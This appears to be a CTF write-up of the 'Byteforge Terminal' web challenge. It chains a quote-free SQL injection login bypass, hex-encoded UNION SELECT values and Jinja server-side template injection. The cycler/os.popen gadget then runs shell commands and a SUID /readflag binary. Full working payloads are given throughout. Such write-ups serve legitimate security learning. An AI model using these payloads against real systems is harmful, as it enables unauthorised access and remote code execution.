---
title: "Byteforge Terminal"
description: "Web exploitation writeup chaining SQL injection, Jinja SSTI, and a SUID helper to read the flag."
date: "2026-05-18"
author: "Carnage"
tags:
  - "EWU National ROBOFEST"
  - "Web"
  - "SSTI"
  - "SQL Injection"
  - "CTF"
draft: false
---

## Overview

`Byteforge Terminal` was a Flask login portal for a restricted node called BYTEFORGE. The description mentioned a crude input sanitizer and hinted that the goal was to read classified schematics from the root partition.

```text
Category: Web Exploitation / CTF
Primary Techniques: SQL injection, Jinja SSTI, SUID-assisted flag read
Target: http://160.187.130.156:55888
```

The solve path chained a quote-free SQL injection into server-side template injection, then used a SUID binary to read the final flag.

## Initial Recon

The app only exposed a login form at `/`. Submitting normal credentials returned an invalid credentials message.

Submitting a single quote in either field returned:

```text
No quotes allowed!
```

That made the bug look like SQL injection with a weak blacklist. Quotes were blocked, but other SQL syntax still worked.

## SQL Injection Bypass

The useful trick was to use a backslash in the username to escape the closing quote in the SQL query, then continue the injection from the password field without using quotes.

```text
username=admin\
password=) OR 1=1-- -
```

This redirected to `/home`, proving that login could be bypassed.

## Finding the Query Shape

Next, `UNION SELECT` was used to learn how many columns the original query used and which value was reflected into the session.

```text
username=admin\
password=) UNION SELECT 1,0x726f6f74-- -
```

`0x726f6f74` is hex for:

```text
root
```

After logging in, `/home` displayed:

```text
user: root
```

So the query had two columns, and the second selected column became the displayed session username. Hex strings were important because the sanitizer blocked quotes.

## SSTI Discovery

The next step was to test whether the displayed username was safely rendered. A Jinja expression was injected through the SQLi.

```jinja
{{7*7}}
```

Hex encoded:

```text
0x7b7b372a377d7d
```

Payload:

```text
username=admin\
password=) UNION SELECT 1,0x7b7b372a377d7d-- -
```

After visiting `/home`, the username rendered as:

```text
49
```

That confirmed server-side template injection in the authenticated page.

## Command Execution

With Jinja SSTI confirmed, the common Flask/Jinja `cycler` gadget was used to run commands.

```jinja
{{ cycler.__init__.__globals__.os.popen('id; pwd; ls -la /').read() }}
```

This showed that the app was running as:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It also listed the root directory and revealed an interesting SUID binary:

```text
-rwsr-xr-x root root /readflag
```

Since `/readflag` was owned by root and had the SUID bit set, it was likely the intended way to read the flag.

## Final Payload

The final Jinja payload was:

```jinja
{{ cycler.__init__.__globals__.os.popen('/readflag').read() }}
```

Hex encoded:

```text
0x7b7b206379636c65722e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e6f732e706f70656e28272f72656164666c616727292e726561642829207d7d
```

Final login payload:

```text
username=admin\
password=) UNION SELECT 1,0x7b7b206379636c65722e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e6f732e706f70656e28272f72656164666c616727292e726561642829207d7d-- -
```

After visiting `/home`, the rendered command output contained the flag:

```text
ROBOFEST{3sc4p3d_qu0t3s_w1th_byt3_f0rc3_ILbHRHK6HEhoBYc89W}
```

## Manual Solve Summary

1. Trigger the quote filter with `'` and notice that only quotes are blocked.
2. Bypass login with a quote-free SQL injection.
3. Confirm `UNION SELECT` control over the displayed username.
4. Test SSTI using hex-encoded `{{7*7}}`.
5. Visit `/home` and confirm it renders `49`.
6. Use Jinja SSTI to run commands and list `/`.
7. Notice `/readflag`.
8. Run `/readflag` through SSTI and read the flag.

## Final Flag

```text
ROBOFEST{3sc4p3d_qu0t3s_w1th_byt3_f0rc3_ILbHRHK6HEhoBYc89W}
```
